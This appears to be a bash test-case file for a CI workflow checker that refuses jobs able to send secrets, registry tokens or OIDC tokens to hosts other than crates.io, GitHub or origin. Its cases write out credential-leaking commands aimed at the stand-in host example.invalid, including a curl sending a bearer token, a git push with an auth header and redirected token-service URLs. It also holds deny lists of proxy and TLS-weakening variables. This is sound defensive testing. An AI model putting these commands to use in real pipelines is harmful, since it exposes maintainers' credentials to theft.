# shellcheck shell=bash disable=SC2016,SC2034,SC2154
# Cases for scripts/check-workflow-pins.sh: the hosts a job beside a secret
# sends its credentials to. cargo publishes to crates.io with no registry
# named, gh talks to github.com, git to origin, curl to crates.io, GitHub
# and the runner's own services, and no variable sends a program elsewhere
# or changes which hosts it trusts. Sourced by
# scripts/check-workflow-pins-tests.sh.

HELD_FILES=()

# cargo: no registry other than the default, in an option, a variable or a
# setting of any cargo configuration the job can read.
REGISTRY="a cargo registry named by"
held_case "a publish to a registry named by --registry is refused" 1 "$HELD, line 7: $REGISTRY --registry: a job beside a secret publishes to crates.io, cargo's default, alone" 'cargo publish --locked --registry mirror -p axess'
held_case "a publish to the default registry named by --registry is refused" 1 "$HELD, line 7: $REGISTRY --registry" 'cargo publish --locked --registry=crates-io -p axess'
held_case "a publish to an index named by --index is refused" 1 "$HELD, line 7: $REGISTRY --index" 'cargo publish --locked --index sparse+https://example.invalid/index/ -p axess'
held_case "a login to another registry is refused" 1 "$HELD, line 7: $REGISTRY --registry" 'cargo login --registry mirror'
OWN_CARGO="which changes the sources or the lockfile or is not needed beside a secret"
held_case "an owner added with the registry token is refused" 1 "$HELD, line 7: cargo owner, $OWN_CARGO" 'cargo owner --add some-login axess'
held_case "a release yanked with the registry token is refused" 1 "$HELD, line 7: cargo yank, $OWN_CARGO" 'cargo yank --version 0.20.0 axess'
held_case "a login that stores the registry token is refused" 1 "$HELD, line 7: cargo login, $OWN_CARGO" 'echo "$TOKEN" | cargo login'
held_case "a registry named before the subcommand is refused" 1 "$HELD, line 7: $REGISTRY --registry" 'cargo --locked publish --registry mirror'
for variable in CARGO_REGISTRIES_MIRROR_INDEX CARGO_REGISTRIES_MIRROR_TOKEN CARGO_REGISTRY_DEFAULT CARGO_REGISTRY_INDEX CARGO_REGISTRY_CREDENTIAL_PROVIDER CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS CARGO_CREDENTIAL_PROVIDER CARGO_HTTP_PROXY CARGO_HTTP_CAINFO CARGO_HTTP_CHECK_REVOKE; do
  block_case "the variable $variable is refused" 1 "line 5: $variable changes what cargo installs or runs" "$variable=x cargo publish --locked"
done
case_ "a registry in an env is refused" 1 "line 4: CARGO_REGISTRIES_MIRROR_INDEX changes what cargo installs or runs" r.yml "jobs:
  a:
    env:
      CARGO_REGISTRIES_MIRROR_INDEX: sparse+https://example.invalid/index/
    steps:
      - run: cargo publish --locked"
config_case "a registry table in a cargo configuration is refused" 1 ".cargo/config.toml: line 2: a setting that changes what cargo fetches or runs is not read: registries.mirror.index" .cargo/config.toml '[registries.mirror]
index = "sparse+https://example.invalid/index/"'
config_case "the default registry in a cargo configuration is refused" 1 ".cargo/config.toml: line 2: a setting that changes what cargo fetches or runs is not read: registry.default" .cargo/config.toml '[registry]
default = "mirror"'
config_case "a credential provider in a cargo configuration is refused" 1 ".cargo/config.toml: line 1: a setting that changes what cargo fetches or runs is not read: registry.global-credential-providers" .cargo/config.toml 'registry.global-credential-providers = ["tools/token"]'
block_case "the default registry in a --config is refused" 1 "line 5: a --config that sets registry.default is not read" "cargo publish --locked --config 'registry.default=\"mirror\"'"
block_case "a registry in a --config is refused" 1 "line 5: a --config that sets registries.mirror.index is not read" "cargo --config 'registries.mirror.index=\"https://example.invalid\"' publish --locked"
held_case "a publish to crates.io with the token in the environment passes" 0 "OK: every action" 'CARGO_REGISTRY_TOKEN="$token" cargo publish --locked -p axess'

# gh: github.com, the repository by OWNER/REPO or $GITHUB_REPOSITORY.
held_case "gh pointed at another host is refused" 1 "$HELD, line 7: gh pointed at another host (--hostname)" 'gh api --hostname example.invalid user'
held_case "a gh repository with a host is refused" 1 "$HELD, line 7: a gh repository that may name another host (example.invalid/o/r)" 'gh release upload --repo example.invalid/o/r v1 axess.crate'
held_case "a gh repository from a variable is refused" 1 "$HELD, line 7: a gh repository that may name another host (\"\$REPO\")" 'gh issue create -R "$REPO" --title t --body b'
held_case "a gh api endpoint that is a URL is refused" 1 "$HELD, line 7: a gh api endpoint that may be a URL of another host (https://example.invalid/x)" 'gh api https://example.invalid/x'
held_case "a gh api endpoint from a variable is refused" 1 "$HELD, line 7: a gh api endpoint that may be a URL of another host (\"\$ENDPOINT\")" 'gh api "$ENDPOINT"'
held_case "gh with the repository of the run passes" 0 "OK: every action" 'gh workflow run release.yml --repo "${GITHUB_REPOSITORY}" --ref "$TAG"' 'gh api -X POST "repos/$GITHUB_REPOSITORY/git/refs" -f ref="refs/tags/$TAG"' 'gh issue list -R example-org/example-repo --state open'

# git: origin, the remote the checkout made.
held_case "a push to a URL is refused" 1 "$HELD, line 7: a git remote other than origin (https://example.invalid/r.git)" 'git -c "http.extraheader=AUTHORIZATION: basic $auth" push https://example.invalid/r.git main'
held_case "a push to another remote is refused" 1 "$HELD, line 7: a git remote other than origin (mirror)" 'git push --force-with-lease mirror main'
held_case "a fetch from another remote is refused" 1 "$HELD, line 7: a git remote other than origin (upstream)" 'git fetch --depth 1 upstream main'
held_case "a remote named by --repo is refused" 1 "$HELD, line 7: a git remote named by --repo (--repo=https://example.invalid/r.git)" 'git push --repo=https://example.invalid/r.git'
held_case "a remote added beside a secret is refused" 1 "$HELD, line 7: a change to the remotes of the checkout (git remote add)" 'git remote add mirror https://example.invalid/r.git'
held_case "the URL of origin changed beside a secret is refused" 1 "$HELD, line 7: a change to the remotes of the checkout (git remote set-url)" 'git remote set-url origin https://example.invalid/r.git'
held_case "a clone beside a secret is refused" 1 "$HELD, line 7: a clone of another repository beside a secret" 'git clone https://example.invalid/r.git'
held_case "the URL of origin set by a setting is refused" 1 "line 7: a git setting that can run a program is not read: remote.origin.url" 'git config remote.origin.url https://example.invalid/r.git'
held_case "pushes and fetches of origin pass" 0 "OK: every action" 'git fetch --no-tags origin "+refs/heads/main:refs/remotes/origin/main"' 'git push --force-with-lease="refs/heads/release/next:$next" origin refs/heads/release/next:refs/heads/release/next' 'git ls-remote --tags origin "refs/tags/$TAG"' 'git push -o ci.skip origin HEAD' 'git remote get-url origin'
free_case "a push to another remote in a job that holds nothing passes" 'git push https://example.invalid/r.git main'

# A variable that sends a program to another host, or changes which hosts
# it trusts, is refused in every job, the runner's own services included.
# A test stands in for the runner's OIDC token service and for the files of
# a step's outputs in a job that holds nothing, where they redirect nothing
# of value; beside a secret they are the runner's alone.
SENDS="points a program at another host, or changes which hosts it trusts"
for variable in GH_HOST GH_REPO GH_ENTERPRISE_TOKEN GITHUB_API_URL GITHUB_SERVER_URL GITHUB_GRAPHQL_URL GITHUB_REPOSITORY ACTIONS_RUNTIME_URL ACTIONS_CACHE_URL ACTIONS_RESULTS_URL HTTPS_PROXY https_proxy ALL_PROXY SSL_CERT_FILE CURL_CA_BUNDLE NODE_EXTRA_CA_CERTS NODE_TLS_REJECT_UNAUTHORIZED GIT_SSL_NO_VERIFY GIT_SSL_CAINFO; do
  block_case "the variable $variable in a script is refused" 1 "line 5: $variable $SENDS" "export $variable=x"
done
case_ "the API URL in the env of an action is refused" 1 "line 8: GITHUB_API_URL $SENDS" e.yml "jobs:
  a:
    permissions:
      contents: write
    steps:
      - uses: softprops/action-gh-release@$SHA # v3.0.4
        env:
          GITHUB_API_URL: https://example.invalid/api"

# A job beside a secret writes the runner's files by their names alone.
held_case "a copy of the path of the environment file is refused" 1 "$HELD, line 7: a copy of the path of a file of the runner (file=\"\$GITHUB_ENV\")" 'file="$GITHUB_ENV"' 'echo "BASH_ENV=tools/env.sh" >> "$file"'
held_case "an indirect expansion is refused" 1 "$HELD, line 8: an indirect expansion (\${!name})" 'name=GITHUB_PATH' 'echo "$PWD/tools" >> "${!name}"'
free_case "an indirect expansion in a job that holds nothing passes" 'for v in VALKEY_URL POSTGRES_URL; do [ -n "${!v:-}" ] || echo "$v"; done'

# A job that may ask for an OIDC token holds the token it exchanges for a
# crates.io one: it publishes to crates.io with no registry named.
oidc_case() { # oidc_case NAME EXPECTED_EXIT FRAGMENT LINE
  TRAILER='' case_ "$1" "$2" "$3" o.yml "permissions:
  contents: read
jobs:
  publish:
    permissions:
      contents: read
      id-token: write
    steps:
      - run: |
          $4"
}
OIDC="a job that may ask for an OIDC token runs what the check does not read: job publish"
oidc_case "an exchanged token sent to another registry is refused" 1 "$OIDC, line 10: a cargo registry named by --registry" 'CARGO_REGISTRY_TOKEN="$token" cargo publish --locked --registry mirror -p axess'
oidc_case "an exchanged token sent to another index is refused" 1 "$OIDC, line 10: a cargo registry named by --index" 'CARGO_REGISTRY_TOKEN="$token" cargo publish --locked --index sparse+https://example.invalid/index/ -p axess'
oidc_case "an exchanged token handed to a registry of another name is refused" 1 "line 10: CARGO_REGISTRIES_MIRROR_TOKEN changes what cargo installs or runs" 'CARGO_REGISTRIES_MIRROR_TOKEN="$token" cargo publish --locked -p axess'
oidc_case "an exchanged token revoked at another host is refused" 1 "$OIDC, line 10: a curl address of a host the check does not name (example.invalid)" 'curl --request DELETE --header "Authorization: Bearer $token" https://example.invalid/api/v1/trusted_publishing/tokens'
oidc_case "a tool installed beside the OIDC permission is refused" 1 "a job that may ask for an OIDC token installs a tool on the same runner: job publish, cargo install at line 10" 'cargo install --locked cargo-cyclonedx@0.5.10'
oidc_case "a publish with an exchanged token to crates.io passes" 0 "OK: every action" 'CARGO_REGISTRY_TOKEN="$token" cargo publish --locked -p axess'

# The runner's stand-ins: allowed in a test job that holds nothing, refused
# in a job beside a secret, in a script, an env or a $GITHUB_ENV line, and
# refused where a job beside a secret takes one from a job that holds
# nothing.
STAND_IN="a stand-in for the runner"
free_case "stand-ins for the OIDC token service in a test pass" 'ACTIONS_ID_TOKEN_REQUEST_URL=http://127.0.0.1:9/token ACTIONS_ID_TOKEN_REQUEST_TOKEN=test echo test'
free_case "stand-ins for the files of a step in a test pass" 'export GITHUB_OUTPUT="$RUNNER_TEMP/output" GITHUB_STATE="$RUNNER_TEMP/state" GITHUB_STEP_SUMMARY="$RUNNER_TEMP/summary"' 'echo "hit=true" >> "$GITHUB_OUTPUT"'
case_ "a stand-in in the env of a test job passes" 0 "OK: every action" t.yml "jobs:
  test:
    env:
      ACTIONS_ID_TOKEN_REQUEST_URL: http://127.0.0.1:9/token
      GITHUB_OUTPUT: /tmp/output
    steps:
      - run: echo test"
HELD_FILES=(scripts/token.sh 'echo token')
held_case "a stand-in for the OIDC token service beside a secret is refused" 1 "$HELD, line 7: $STAND_IN (ACTIONS_ID_TOKEN_REQUEST_URL): a job beside a secret takes the runner's own" 'ACTIONS_ID_TOKEN_REQUEST_URL=https://example.invalid/token ./scripts/token.sh exchange'
held_case "a stand-in for the request token beside a secret is refused" 1 "$HELD, line 7: $STAND_IN (ACTIONS_ID_TOKEN_REQUEST_TOKEN)" 'export ACTIONS_ID_TOKEN_REQUEST_TOKEN=x'
held_case "a stand-in for the outputs file beside a secret is refused" 1 "$HELD, line 7: $STAND_IN (GITHUB_OUTPUT)" 'GITHUB_OUTPUT="$RUNNER_TEMP/output" ./scripts/token.sh'
held_case "a stand-in for the state file beside a secret is refused" 1 "$HELD, line 7: $STAND_IN (GITHUB_STATE)" 'export GITHUB_STATE=x'
held_case "a stand-in for the summary written for the later steps beside a secret is refused" 1 "$HELD, line 7: $STAND_IN (GITHUB_STEP_SUMMARY)" 'echo "GITHUB_STEP_SUMMARY=/tmp/summary" >> "$GITHUB_ENV"'
TRAILER='' case_ "a stand-in in the env of a job that may ask for an OIDC token is refused" 1 "a job that may ask for an OIDC token runs what the check does not read: job publish, line 8: $STAND_IN (ACTIONS_ID_TOKEN_REQUEST_URL)" o.yml "jobs:
  publish:
    permissions:
      contents: read
      id-token: write
    steps:
      - env:
          ACTIONS_ID_TOKEN_REQUEST_URL: https://example.invalid/token
        run: ./scripts/token.sh exchange" scripts/token.sh 'echo token'
case_ "a stand-in in the env of a workflow with a job beside a secret is refused" 1 "a job that names a secret runs what the check does not read: job publish, line 2: $STAND_IN (GITHUB_OUTPUT)" w.yml "env:
  GITHUB_OUTPUT: /tmp/output
jobs:
  test:
    steps:
      - run: echo test
  publish:
    env:
      TOKEN: \${{ secrets.TOKEN }}
    steps:
      - run: echo publish"
case_ "a stand-in a test job hands to a job beside a secret is refused" 1 "a job that may ask for an OIDC token runs what the check does not read: job publish, line 16: $STAND_IN (ACTIONS_ID_TOKEN_REQUEST_URL)" b.yml "jobs:
  test:
    outputs:
      url: \${{ steps.stand.outputs.url }}
    steps:
      - id: stand
        run: |
          echo \"url=http://127.0.0.1:9/token\" >> \"\$GITHUB_OUTPUT\"
  publish:
    needs: test
    permissions:
      contents: read
      id-token: write
    steps:
      - env:
          ACTIONS_ID_TOKEN_REQUEST_URL: \${{ needs.test.outputs.url }}
        run: ./scripts/token.sh exchange" scripts/token.sh 'echo token'
case_ "an outputs file a test job hands to a job beside a secret is refused" 1 "a job that names a secret runs what the check does not read: job publish, line 15: $STAND_IN (GITHUB_OUTPUT)" b.yml "jobs:
  test:
    outputs:
      file: \${{ steps.stand.outputs.file }}
    steps:
      - id: stand
        run: echo \"file=/tmp/output\" >> \"\$GITHUB_OUTPUT\"
  publish:
    needs: test
    env:
      TOKEN: \${{ secrets.TOKEN }}
    steps:
      - env:
          FILE: \${{ needs.test.outputs.file }}
        run: GITHUB_OUTPUT=\"\$FILE\" ./scripts/token.sh" scripts/token.sh 'echo token'
